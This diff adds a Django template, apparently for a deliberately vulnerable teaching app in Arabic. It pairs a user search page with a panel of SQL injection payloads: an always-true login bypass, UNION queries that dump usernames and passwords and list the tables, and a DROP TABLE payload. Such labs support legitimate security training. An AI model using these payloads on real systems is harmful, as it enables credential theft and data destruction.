@@ -1,0 +1,160 @@
+<!-- templates/sql_injection.html -->
+{% extends './base.html' %} {% load static %} {% block title %}حقن SQL الضعيف
+{%endblock %} {% block hero %}
+
+<div
+  class="bg-image"
+  style="
+    background-image: url('{% static 'cyper_app/img/sql_injection.jpg' %}');
+    min-height: 190vh;
+  "
+  id="mainContent">
+  <div class="bg-overlay">
+    <div class="container content-overlay py-5">
+      <h1 class="display-4">المستخدمون:</h1>
+      <form class="mb-3">
+        <div class="mb-3">
+          <label for="username" class="form-label">البحث عن مستخدم:</label>
+          <input
+            dir="ltr"
+            type="text"
+            class="form-control"
+            id="username"
+            name="username" />
+        </div>
+        <button type="submit" class="btn btn-primary">بحث</button>
+      </form>
+      <div class="container mt-5">
+        <div class="row justify-content-center">
+          {% for user in users %}
+          <div class="col-md-4 col-sm-6 mb-4">
+            <div class="card bg-dark text-white text-center h-100">
+              <div class="card-body d-flex flex-column align-items-center">
+                <img
+                  class="rounded-circle mb-3"
+                  width="50px"
+                  height="50px"
+                  src="/media/{% if user.1  %}{{ user.1 }}{% else %}None.png{%endif%}" />
+                <h5 class="card-title">{{ user.0 }}</h5>
+              </div>
+            </div>
+          </div>
+          {% empty %}
+          <div class="col-md-4 col-sm-6 mb-4">
+            <div class="card bg-dark text-white text-center h-100">
+              <div class="card-body d-flex flex-column align-items-center">
+                <img
+                  class="rounded-circle mb-3"
+                  width="50px"
+                  height="50px"
+                  src="/media/None.png" />
+                <h5 class="card-title">لا يوجد مستخدم بهذا الاسم</h5>
+              </div>
+            </div>
+          </div>
+          {% endfor %} {% if message %}
+          <div class="col-12">
+            <div class="alert alert-danger fs-3 text-center" role="alert">
+              {{ message }}
+            </div>
+          </div>
+          {% endif %}
+        </div>
+      </div>
+
+      <hr class="my-4" />
+      <p>استكشف أهم الأوامر المستخدمة في هذه الثغرة.</p>
+      <button class="btn btn-primary btn-lg" id="learnMoreBtn">
+        تعلم المزيد
+      </button>
+      <div class="hacking-info" id="hackingInfo">
+        <div class="hacking-item">
+          <div class="hacking-text">
+            <h3>لإظهار جميع المستخدمين و اختبار ثغرة ال SQL Injection</h3>
+            <div class="viewport" dir="ltr">
+              <div class="card">
+                <div class="header">
+                  <div class="dot red"></div>
+                  <div class="dot yellow"></div>
+                  <div class="dot green"></div>
+                </div>
+                <div class="content">
+                  <code>' OR '1'='1</code>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <hr class="my-4" />
+        <div class="hacking-item">
+          <div class="hacking-text">
+            <h3>استعلام UNION لاسترجاع معلومات إضافية:</h3>
+            <div class="viewport" dir="ltr">
+              <div class="card">
+                <div class="header">
+                  <div class="dot red"></div>
+                  <div class="dot yellow"></div>
+                  <div class="dot green"></div>
+                </div>
+                <div class="content">
+                  <code
+                    >' UNION SELECT username||" " || password as
+                    "user_and_password", NULL FROM cyper_app_user --</code
+                  >
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <hr class="my-4" />
+        <div class="hacking-item">
+          <div class="hacking-text">
+            <h3>استعلام لمعرفة أسماء الجداول في قاعدة البيانات:</h3>
+            <div class="viewport" dir="ltr">
+              <div class="card">
+                <div class="header">
+                  <div class="dot red"></div>
+                  <div class="dot yellow"></div>
+                  <div class="dot green"></div>
+                </div>
+                <div class="content">
+                  <code
+                    >' UNION SELECT name, NULL FROM sqlite_master WHERE
+                    type='table' --</code
+                  >
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <hr class="my-4" />
+        <div class="hacking-item">
+          <div class="hacking-text">
+            <h3 class="text-danger">
+              محاولة حذف جدول (خطير جدًا، لا تستخدمه إلا إذا كنت متأكدًا تمامًا)
+            </h3>
+            <div class="viewport" dir="ltr">
+              <div class="card">
+                <div class="header">
+                  <div class="dot red"></div>
+                  <div class="dot yellow"></div>
+                  <div class="dot green"></div>
+                </div>
+                <div class="content">
+                  <code>'; DROP TABLE cyper_app_user; --</code>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+{% endblock %} {% block scripts %}
+<script>
+  const mainContentHeight = 210;
+</script>
+
+{% endblock scripts %}
